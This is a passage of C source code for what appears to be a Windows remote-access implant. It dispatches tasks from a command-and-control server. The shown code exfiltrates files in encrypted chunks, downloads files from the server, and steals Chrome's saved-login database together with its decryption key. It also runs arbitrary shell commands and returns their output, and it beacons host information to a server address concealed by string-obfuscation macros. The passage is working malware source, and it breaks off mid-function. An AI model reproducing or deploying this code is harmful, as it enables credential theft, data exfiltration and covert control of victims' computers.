                        fileStream->actualRead = chunkSize_final;
                        fileStream->chunk.size = chunkSize_final;
                        memcpy(fileStream->chunk.bytes, &fileTarget.lpBuffer[bytesRead], chunkSize_final);

                        // Serialize
                        stream = pb_ostream_from_buffer(buffer_serialize, 1024 * 1048 * 3);
                        err_check = serialize(&stream, fileStream, FileStream_fields);
                        if (err_check == 0) {
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            HeapFree(GetProcessHeap(), 0, buffer_data);
                            debug_printf("[-] In Exec() UPLOAD: Failed to serialzied fileStream\n");
                            return ERROR_GEN_FAILURE;
                        }
                        
                        /* Encrypt Message */
                        // Allocate buffer to hold the ciphertext
                        LPBYTE ciphertext = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, crypto_aead_chacha20poly1305_ABYTES + err_check);
                        size_t ciphertext_len;
                        if (ciphertext == NULL) {
                            debug_printf("[-] In Exec() UPLOAD: Failed to Allocate memory for ciphertext.\n");
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            HeapFree(GetProcessHeap(), 0, buffer_data);

                            return ERROR_GEN_FAILURE;
                        }
                        crypto_aead_chacha20poly1305_encrypt(ciphertext, &ciphertext_len, 
                                                            buffer_serialize, err_check, 
                                                            NULL, 0, NULL, 
                                                            nonce_send, session_key_send);

                        /* Encapsulate */
                        // Filling neccesary fields
                        strcpy(message_encrypt_large->guid_ephmeral, client_guid_ephemeral_b64);
                        message_encrypt_large->ciphertext.size = ciphertext_len;
                        memcpy(message_encrypt_large->ciphertext.bytes, ciphertext, ciphertext_len);
                        stream = pb_ostream_from_buffer(buffer_data, REQUSET_BUFSIZE);
                        err_check = serialize(&stream, message_encrypt_large, Message_encrypt_large_fields);
                        if (err_check == 0) {
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            HeapFree(GetProcessHeap(), 0, ciphertext);
                            HeapFree(GetProcessHeap(), 0, buffer_data);
                            debug_printf("[-] In Exec() UPLOAD: Failed to serialzied message_encrypt_large\n");
                            return ERROR_GEN_FAILURE;
                        }

                        memcpy(pchRequest, URL, URL_SIZE);
                        memcpy(&pchRequest[URL_SIZE], buffer_data, err_check);

                        char buffer_received[4096]; DWORD actualReceivedSize;
                        if (pipeClient(pipeFullPath, pchRequest, err_check + URL_SIZE, 
                                       (LPBYTE)buffer_received, sizeof(buffer_received), 
                                       &actualReceivedSize) != ERROR_SUCCESS) {
                            debug_printf("[-] Can't send protobuf in UPLOAD\n");
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            HeapFree(GetProcessHeap(), 0, ciphertext);
                            HeapFree(GetProcessHeap(), 0, buffer_data);
                            return ERROR_GEN_FAILURE;
                        }
                        
                        HeapFree(GetProcessHeap(), 0, ciphertext);
                    }
                    if (derive_nonce_kdf_session(key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                                suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                                key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                                client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                        debug_printf("[-] Can't generate guid_ephmeral subURL and guid_kdf key\n");
                        return ERROR_GEN_FAILURE;
                    }
                    if (derive_nonce_kdf_session(key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                                nonce_send, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                                key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                                session_key_send, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                        debug_printf("[-] Can't generate send Session key\n");
                        return ERROR_GEN_FAILURE;
                    }
                    if (derive_nonce_kdf_session(key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                                nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                                key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                                session_key_rcv, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                        debug_printf("[-] Can't generate rcv Session key\n");
                        return ERROR_GEN_FAILURE;
                    }
                    sodium_bin2base64(client_guid_ephemeral_b64, sizeof(client_guid_ephemeral_b64), 
                                        client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES, 
                                        sodium_base64_VARIANT_ORIGINAL);
                    Sleep(200);
                }
                debug_printf("\nbytes read small:%llu\n", bytesRead);
                // HeapFree(GetProcessHeap(), 0, chunk);
                HeapFree(GetProcessHeap(), 0, fileStream);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                HeapFree(GetProcessHeap(), 0, buffer_data);
            } else {
                debug_printf("map file failed\n");
                unMapFile(&fileTarget);
                return ERROR_GEN_FAILURE;
            }
            unMapFile(&fileTarget);
            return ERROR_SUCCESS;
        
        }

        case DOWNLOAD: {
            debug_printf(" === Executing DOWNLOAD === \n");
            DWORD flag = ERROR_SUCCESS;
            // Parse Argument fileSize, fileName, 5000|example.txt
            size_t filesize = 0;
            char filename[256] = {0}; char filepath[512] = {0};
            DWORD chunkSize = 3145728;
            BYTE buffer_serialize[4096]; size_t actualSerializedSize;
            pb_ostream_t stream_o; pb_istream_t stream_i;
            size_t err_check;


            if (parseDownloadArg(args, &filesize, filename, filepath, sizeof(filename), sizeof(filepath)) != ERROR_SUCCESS) {
                debug_printf("in DOWNLOAD can't parse filesize and filename \n");
                return ERROR_GEN_FAILURE;
            }
            debug_printf("filesize is %lld\n", filesize);
            debug_printf("filename is %s\n", filename);
            debug_printf("filepath is %s\n", filepath);
            // HeapAlloc
            LPBYTE file_buffer = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, filesize);
            if (file_buffer == NULL) {
                debug_printf("Can't allocate file buffer\n");
                return ERROR_GEN_FAILURE;
            }
            File_Download_Response* file_response = (File_Download_Response*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(File_Download_Response));
            if (file_response == NULL) {
                debug_printf("Can't allocate file_response\n");
                HeapFree(GetProcessHeap(), 0, file_buffer);
                return ERROR_GEN_FAILURE;
            }
            Message_encrypt msg_enc = Message_encrypt_init_zero;
            LPBYTE received_buffer = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, REPLY_BUFSIZE);
            
            LPBYTE received_decryption = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, REPLY_BUFSIZE); size_t actualDecryptedSize;
            if (received_decryption == NULL) {
                debug_printf("Can't allocate received_decryption\n");
                HeapFree(GetProcessHeap(), 0, file_buffer);
                HeapFree(GetProcessHeap(), 0, file_response);
                return ERROR_GEN_FAILURE;
            }
            // calculate max_order_times, aka max request times
            int max_request_times = (filesize + chunkSize - 1) / chunkSize;


            // 3|example.txt
            for (int order_time = 0; order_time < max_request_times; order_time++) {
                
                // Construct File download request
                File_Download_Request fileRequest;
                strcpy(fileRequest.guid, client_guid_real_b64);
                strcpy(fileRequest.filename, filename);
                fileRequest.order = order_time;
                
                // Serialize Data
                stream_o = pb_ostream_from_buffer(buffer_serialize, sizeof(buffer_serialize));
                err_check = serialize(&stream_o, &fileRequest, File_Download_Request_fields);
                if (err_check == 0) {
                    debug_printf("can't serialize buffer\n");
                    flag = ERROR_GEN_FAILURE;
                    break;
                }
                actualSerializedSize = err_check;

                // Add encryption here
                uint8_t ciphertext[actualSerializedSize + crypto_aead_chacha20poly1305_ABYTES]; size_t ciphertext_len;
                crypto_aead_chacha20poly1305_encrypt(
                                            ciphertext, &ciphertext_len,
                                            buffer_serialize, actualSerializedSize,
                                            NULL, 0, NULL, 
                                            nonce_send, session_key_send);
                msg_enc.ciphertext.size = ciphertext_len;
                memcpy(msg_enc.ciphertext.bytes, ciphertext, ciphertext_len);
                strcpy(msg_enc.guid, client_guid_ephemeral_b64);
                
                // Serialzie Data Again
                SecureZeroMemory(buffer_serialize, sizeof(buffer_serialize));
                stream_o = pb_ostream_from_buffer(buffer_serialize, sizeof(buffer_serialize));
                err_check = serialize(&stream_o, &msg_enc, Message_encrypt_fields);
                actualSerializedSize = err_check;

                char URL[URL_SIZE] = {0};
                
                LAIKA_BOX_STARTVAR(char*, path_download, KEY_interneth_PATH_DOWNLOAD, DATA_interneth_PATH_DOWNLOAD)
                getting_URL(suburl_bin, path_download, URL);
                LAIKA_BOX_ENDVAR(path_download)

                // Send to server
                memcpy(pchRequest, URL, URL_SIZE);
                memcpy(&pchRequest[URL_SIZE], buffer_serialize, actualSerializedSize);
                DWORD actualReceivedSize;
                // Tell C2 server which chunk of the file we want
                if (pipeClient(pipeFullPath, pchRequest, err_check + URL_SIZE,        
                                received_buffer, REPLY_BUFSIZE, 
                                &actualReceivedSize) != ERROR_SUCCESS) {
                    debug_printf("[-] Can't send protobuf in DOWNLOAD\n");
                    flag = ERROR_GEN_FAILURE;
                    break;
                }
                
                // Decrypt the received data
                if(crypto_aead_chacha20poly1305_decrypt(received_decryption, &actualDecryptedSize, NULL, 
                                            received_buffer, actualReceivedSize, 
                                            NULL, 0, 
                                            nonce_rcv, session_key_rcv) != 0) {
                    debug_printf("In exec -> Download: Can't Decrypt received response from server \n");
                    debug_printf("Nonce_rcv:");print_base64(nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES);
                    flag = ERROR_GEN_FAILURE;
                    break;
                }
                // Deserialzie the pchReply
                stream_i = pb_istream_from_buffer(received_decryption, actualDecryptedSize);
                err_check = deserialize(&stream_i, file_response, File_Download_Response_fields);
                if (err_check != 0) {
                    debug_printf("[-] Exec DOWNLOAD: Can't deserialize decrypted Task message \n");
                    flag = ERROR_GEN_FAILURE;
                    break;
                }
                // Read files
                memcpy(&file_buffer[order_time * chunkSize], file_response->chunk.bytes, file_response->chunkSize);

                // Add Rachet
                if (derive_nonce_kdf_session(key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                            suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                            key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                            client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                    debug_printf("[-] Can't generate guid_ephmeral subURL and guid_kdf key\n");
                    flag = ERROR_GEN_FAILURE;
                    break;                
                }
                if (derive_nonce_kdf_session(key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                            nonce_send, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                            key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                            session_key_send, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                    debug_printf("[-] Can't generate send Session key\n");
                    flag = ERROR_GEN_FAILURE;
                    break;
                }
                if (derive_nonce_kdf_session(key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                            nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                            key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                            session_key_rcv, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                    debug_printf("[-] Can't generate rcv Session key\n");
                    flag = ERROR_GEN_FAILURE;
                    break;
                }
                sodium_bin2base64(client_guid_ephemeral_b64, sizeof(client_guid_ephemeral_b64), 
                                    client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES, 
                                    sodium_base64_VARIANT_ORIGINAL);
                Sleep(1000);
            }
            DWORD numberBytesWritten = 0;
            HANDLE hFile;
            if (flag == ERROR_SUCCESS) {
                hFile = 
                CreateFileA(strcat(filepath, filename),
                            GENERIC_WRITE,
                            0,
                            NULL,
                            CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL,
                            NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    WriteFile(hFile, file_buffer, (DWORD)filesize, &numberBytesWritten, NULL);
                    CloseHandle(hFile);
                } else {
                    debug_printf("Cannot open file\n");
                    flag = ERROR_GEN_FAILURE;
                }
            } else {
                debug_printf("flag failed %ld", GetLastError());
            }
            HeapFree(GetProcessHeap(), 0, file_buffer);
            HeapFree(GetProcessHeap(), 0, file_response);
            HeapFree(GetProcessHeap(), 0, received_decryption);
            return flag;
        }

        case CHROME: {
            LPSTR key = getChromeDecryptionKey(NULL);
            if (key == NULL) {
                return ERROR_GEN_FAILURE;
            }
            LPSTR filePath = getChromeLocalLoginPath(NULL);
            if (filePath == NULL) {
                return ERROR_GEN_FAILURE;
            }
            file_t fileTarget;
            if (!mapFile(filePath, &fileTarget)) {
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            
            Chrome_info* chrome_info = (Chrome_info*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Chrome_info));
            if (chrome_info == NULL) {
                debug_printf("[-] In Exec CHROME: Failed to Allocate memory for chrome_info.\n");
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            LPBYTE buffer_serialize = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, 1024 * 1048 * 3 * sizeof(BYTE));
            if (buffer_serialize == NULL) {
                debug_printf("[-] In Exec CHROME: Failed to Allocate memory for buffer_serialize.\n");
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, chrome_info);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            
            Message_encrypt_large* message_encrypt_large = (Message_encrypt_large*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Message_encrypt_large));
            if (message_encrypt_large == NULL) {
                debug_printf("[-] In Exec UPLOAD: Failed to Allocate memory for message_encrypt_large.\n");
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, chrome_info);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            
            pb_ostream_t stream;
            size_t err_check;
            
            strcpy(chrome_info->guid, client_guid_real_b64);
            strcpy(chrome_info->enc_key, key);
            chrome_info->dbfile.size = fileTarget.fileSize.QuadPart;
            memcpy(chrome_info->dbfile.bytes, fileTarget.lpBuffer, fileTarget.fileSize.QuadPart);
            debug_printf("fileSize:%lld", fileTarget.fileSize.QuadPart);
            // Serialize
            stream = pb_ostream_from_buffer(buffer_serialize, 1024 * 1048 * 3);
            err_check = serialize(&stream, chrome_info, Chrome_info_fields);
            if (err_check == 0) {
                debug_printf("[-] In Exec UPLOAD: Failed to serialzie for chrome_info.\n");
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, chrome_info);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            
            // Encrypt
            LPBYTE ciphertext = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, crypto_aead_chacha20poly1305_ABYTES + err_check);
            if (ciphertext == NULL) {
                debug_printf("[-] In Exec UPLOAD: Failed to allocate mem for ciphertext.\n");
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, chrome_info);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            size_t ciphertext_len;
            crypto_aead_chacha20poly1305_encrypt(ciphertext, &ciphertext_len, 
                                                buffer_serialize, err_check, 
                                                NULL, 0, NULL, 
                                                nonce_send, session_key_send);

            /* Encapsulate */
            LPBYTE buffer_data = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, (REQUSET_BUFSIZE - URL_SIZE) * sizeof(BYTE));
            
            if (buffer_data == NULL) {
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, ciphertext);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, chrome_info);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            strcpy(message_encrypt_large->guid_ephmeral, client_guid_ephemeral_b64);
            message_encrypt_large->ciphertext.size = ciphertext_len;
            memcpy(message_encrypt_large->ciphertext.bytes, ciphertext, ciphertext_len);
            stream = pb_ostream_from_buffer(buffer_data, REQUSET_BUFSIZE - URL_SIZE);
            err_check = serialize(&stream, message_encrypt_large, Message_encrypt_large_fields);
            if (err_check == 0) {
                debug_printf("[-] In Exec UPLOAD: Failed to serialize for message_encrypt_large\n");
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, buffer_data);
                HeapFree(GetProcessHeap(), 0, ciphertext);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, chrome_info);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }

            char buffer_received[4096]; DWORD actualReceivedSize;
            char URL[URL_SIZE] = {0}; 
            
            LAIKA_BOX_STARTVAR(char*, path_chrome, KEY_interneth_PATH_CHROME, DATA_interneth_PATH_CHROME);
            getting_URL(suburl_bin, path_chrome, URL); 
            LAIKA_BOX_ENDVAR(path_chrome);

            memcpy(pchRequest, URL, URL_SIZE);
            memcpy(&pchRequest[URL_SIZE], buffer_data, err_check);
            if (pipeClient(pipeFullPath, pchRequest, err_check + URL_SIZE, 
                           (LPBYTE) buffer_received, sizeof(buffer_received),
                           &actualReceivedSize) != ERROR_SUCCESS) {
                debug_printf("[-] Can't send protobuf in UPLOAD\n");
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, buffer_data);
                HeapFree(GetProcessHeap(), 0, ciphertext);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, chrome_info);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            // Increase Rachet
            {
                if (derive_nonce_kdf_session(key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                            suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                            key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                            client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                    debug_printf("[-] Can't generate guid_ephmeral subURL and guid_kdf key\n");
                    return ERROR_GEN_FAILURE;
                }
                if (derive_nonce_kdf_session(key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                            nonce_send, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                            key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                            session_key_send, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                    debug_printf("[-] Can't generate send Session key\n");
                    return ERROR_GEN_FAILURE;
                }
                if (derive_nonce_kdf_session(key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                            nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                            key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                            session_key_rcv, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                    debug_printf("[-] Can't generate rcv Session key\n");
                    return ERROR_GEN_FAILURE;
                }
                sodium_bin2base64(client_guid_ephemeral_b64, sizeof(client_guid_ephemeral_b64), 
                                    client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES, 
                                    sodium_base64_VARIANT_ORIGINAL);
            }
            
            unMapFile(&fileTarget);
            HeapFree(GetProcessHeap(), 0, buffer_data);
            HeapFree(GetProcessHeap(), 0, ciphertext);
            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
            HeapFree(GetProcessHeap(), 0, buffer_serialize);
            HeapFree(GetProcessHeap(), 0, chrome_info);
            HeapFree(GetProcessHeap(), 0, key);
            HeapFree(GetProcessHeap(), 0, filePath);
            return ERROR_SUCCESS;
            ERROR_SUCCESS;
        }

        default:
            return ERROR_SUCCESS;
    }
    return ERROR_SUCCESS;
}

DWORD execTask(DWORD opcode, char* msg_args, LPBYTE pchRequest, LPBYTE pchReply,
               uint8_t* suburl_bin, uint8_t* client_guid_ephemeral, uint8_t* key_kdf_guid, 
               uint8_t* nonce_send, uint8_t* session_key_send, uint8_t* key_kdf_send,
               uint8_t* nonce_rcv, uint8_t* session_key_rcv, uint8_t* key_kdf_rcv,
               char* client_guid_real_b64, DWORD* beacon_Interval) {

    char client_guid_ephemeral_b64[crypto_kx_PUBLICKEYBYTES * 2];
    sodium_bin2base64(client_guid_ephemeral_b64, sizeof(client_guid_ephemeral_b64), 
                      client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES, 
                      sodium_base64_VARIANT_ORIGINAL);
    char args[4096] = {0};
    strcpy(args, msg_args);
    debug_printf( " Task Argument:%s \n", args);
    debug_printf(" === Task Execution === \n");
    switch (opcode) {
        case IDLE: {
            debug_printf("== EXECUTING IDLE ==\n");
            return ERROR_SUCCESS;
        }

        case DISSOLVE: {
            debug_printf(" == EXECUTING DISSOLVE ==\n");
            exit(0);
        }

        case ADJUST_BEACON:{
            debug_printf(" == EXECUTING ADJUST_BEACON ==\n");
            debug_printf("new beacon interval: %d", atoi(args));
            *beacon_Interval = atoi(args);
            return ERROR_SUCCESS;
        }

        case SMOKESCREEN:{
            debug_printf(" == EXECUTING SMOKESCREEN ==\n");
            int smoke_max = atoi(args);
            int smoke = 0;
            while (smoke <= smoke_max) {
                /* Generate random data */
                /* Generate random URL */
                /* Send to the URL without caring about results */
            }
            return ERROR_SUCCESS;
        }

        case TAUNT: {
            return call_calc();
        }
        
        case HOWLER: {
            int repeat_howler;
            char text_howler[128];
            int repeat = 0;
            if (parseHowler(args, &repeat_howler, text_howler) != ERROR_SUCCESS) {
                return ERROR_GEN_FAILURE;
            }
            while (repeat <= repeat_howler) {
                ShowMessageBoxAsync(text_howler);
                repeat++;
            }
            return ERROR_SUCCESS;
        }

        case INFOGATHER: {
            debug_printf(" == EXECUTING INFOGATHER ==\n");
            SecureZeroMemory(pchRequest, REQUSET_BUFSIZE);
            BYTE buffer_serialize[4096];
            size_t actualSerializedSize;
            if (infoGather(buffer_serialize, 4096, &actualSerializedSize, client_guid_real_b64) != ERROR_SUCCESS) {
                debug_printf("[-] In Exec -> INFOGATHER: Failed to infoGather\n");
                return ERROR_GEN_FAILURE;
            }
            if (actualSerializedSize == 0) {
                debug_printf("[-] In Exec -> INFOGATHER: Failed to serialize\n");
                return ERROR_GEN_FAILURE;
            }
            BYTE ciphertext[actualSerializedSize + crypto_aead_chacha20poly1305_ABYTES];
            size_t ciphertext_len;
            crypto_aead_chacha20poly1305_encrypt(
                                            ciphertext, &ciphertext_len,
                                            buffer_serialize, actualSerializedSize,
                                            NULL, 0, NULL, 
                                            nonce_send, session_key_send);
            // Encapsulate Message into msg_enc
            Message_encrypt msg_enc = Message_encrypt_init_zero;
            msg_enc.ciphertext.size = ciphertext_len;
            memcpy(msg_enc.ciphertext.bytes, ciphertext, ciphertext_len);
            strcpy(msg_enc.guid, client_guid_ephemeral_b64);

            // Serialzie Data Again
            SecureZeroMemory(buffer_serialize, sizeof(buffer_serialize));
            pb_ostream_t stream_o = pb_ostream_from_buffer(buffer_serialize, sizeof(buffer_serialize));
            size_t err_check = serialize(&stream_o, &msg_enc, Message_encrypt_fields);
            if (err_check == 0) debug_printf( "[-] Can't serialize buffer for msg_enc.\n");
            actualSerializedSize = err_check;

            char URL[URL_SIZE] = {0}; 
            
            LAIKA_BOX_STARTVAR(char*, path_infogather, KEY_interneth_PATH_INFOGATHER, DATA_interneth_PATH_INFOGATHER)
            getting_URL(suburl_bin, path_infogather, URL);
            LAIKA_BOX_ENDVAR(path_infogather)

            char buffer_received[4096]; DWORD actualReceivedSize;
            #ifdef PRODUCTION
            LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_PROD, DATA_interneth_SERVER_ADDR_PROD);
            #else
            LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_TEST, DATA_interneth_SERVER_ADDR_TEST);
            #endif
            if (connectServer(server_addr, SERVER_PORT_C2, URL, 
                            (LPBYTE) buffer_serialize, actualSerializedSize, 
                            (LPBYTE) buffer_received, sizeof(buffer_received), 
                            &actualReceivedSize) != ERROR_SUCCESS) {
                debug_printf("[-] Can't send protobuf in Beacon\n");
                return ERROR_NOT_CONNECTED;
            }
            LAIKA_BOX_ENDVAR(server_addr);

            if (derive_nonce_kdf_session(key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                        suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                        key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                        client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                debug_printf("[-] Can't generate guid_ephmeral subURL and guid_kdf key\n");
                return ERROR_GEN_FAILURE;
            }
            if (derive_nonce_kdf_session(key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                        nonce_send, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                        key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                        session_key_send, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                debug_printf("[-] Can't generate send Session key\n");
                return ERROR_GEN_FAILURE;
            }
            if (derive_nonce_kdf_session(key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                        nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                        key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                        session_key_rcv, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                debug_printf("[-] Can't generate rcv Session key\n");
                return ERROR_GEN_FAILURE;
            }

            return ERROR_SUCCESS;
        }

        case SHELLCMD:{
            debug_printf(" == EXECUTING SHELLCMD ==\n");
            SecureZeroMemory(pchRequest, REQUSET_BUFSIZE);
            LPBYTE buffer_result = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, 1024 * 768 * 3 * sizeof(BYTE));
            if (buffer_result == NULL) {
                debug_printf("[-] In Exec(): Failed to Allocate memory for shell command result\n");
                return ERROR_GEN_FAILURE;
            }

            // memcpy(buffer_result, "abc", 3);
            if (runShellCommand(args, (LPSTR)buffer_result, 1024*1024*3) != ERROR_SUCCESS) {  // Run args and put result to buffer_result
                debug_printf("[-] In Exec():Failed to execute runShellCommand.\n");
                HeapFree(GetProcessHeap(), 0, buffer_result);
                return ERROR_GEN_FAILURE;
            }
            debug_printf("buffer_result length: %lld", strlen((char*)buffer_result));
            /* Parse into data */
            Shell_execution* shell_result = (Shell_execution*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Shell_execution));
            if (shell_result == NULL) {
                debug_printf("[-] In Exec():Failed to allocate memory for shell_result.\n");
                HeapFree(GetProcessHeap(), 0, buffer_result);;
                return ERROR_GEN_FAILURE;
            }
            LPBYTE buffer_serialize = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, 1024 * 1024 * 3 * sizeof(BYTE));
            if (buffer_serialize == NULL) {
                debug_printf("[-] In Exec(): Failed to Allocate memory for buffer_serialize.\n");
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                return ERROR_GEN_FAILURE;
            }
            
            // Filling neccesary fields
            strcpy(shell_result->guid, client_guid_real_b64);
            strcpy(shell_result->result, (char*)buffer_result);
            strcpy(shell_result->command, args);
            
            /* Serialize shell_execution*/
            pb_ostream_t stream = pb_ostream_from_buffer(buffer_serialize, 1024 * 1024 * 3);
            size_t err_check = serialize(&stream, shell_result, Shell_execution_fields);
            if (err_check == 0) {
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                debug_printf("[-] In Exec(): Failed to serialzied shell_result\n");
                return ERROR_GEN_FAILURE;
            }
            
            /* Encrypt message */
            // Allocate buffer to hold the ciphertext
            LPBYTE ciphertext = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, crypto_aead_chacha20poly1305_ABYTES + err_check);
            size_t ciphertext_len;
            if (ciphertext == NULL) {
                debug_printf("[-] In Exec(): Failed to Allocate memory for ciphertext.\n");
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                return ERROR_GEN_FAILURE;
            }
            crypto_aead_chacha20poly1305_encrypt(ciphertext, &ciphertext_len, 
                                                 buffer_serialize, err_check, 
                                                 NULL, 0, NULL, 
                                                 nonce_send, session_key_send);

            /* Encapsulate */
